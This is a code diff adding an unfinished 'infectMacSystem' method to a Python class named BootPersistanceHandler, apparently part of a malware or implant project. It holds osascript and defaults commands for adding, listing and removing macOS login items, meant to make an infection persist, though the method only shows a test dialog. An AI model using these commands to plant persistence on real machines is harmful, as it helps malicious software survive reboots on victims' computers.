@@ -188,6 +188,26 @@ class BootPersistanceHandler:
         pass
 
     #
+    # Infect macOS system
+    #
+
+    def infectMacSystem(self):
+        # TODO:
+        # 1. Check if not infected
+        # 2. If it is not then infect via AppleScript to Login startup items
+
+        infectCommandToCheck = r"defaults write loginwindow AutoLaunchedApplicationDictionary -array-add '{ \"Path\" = \"/path/to/itemname\"; \"Hide\" = 0; }'"
+
+
+        infectCommand = r"osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/path/to/itemname\", hidden:false}'"
+        removeCommand = r"osascript -e 'tell application \"System Events\" to delete login item \"itemname\"'"
+        listCommand = r"osascript -e 'tell application \"System Events\" to get the name of every login item'"
+
+        command = "osascript -e 'display dialog \"Hello from osxdaily.com\" with title \"Hello\"'"
+        results = subprocess.check_output(command, shell=True).decode('utf-8')
+        print(results)
+
+    #
     # Start here
     #
 
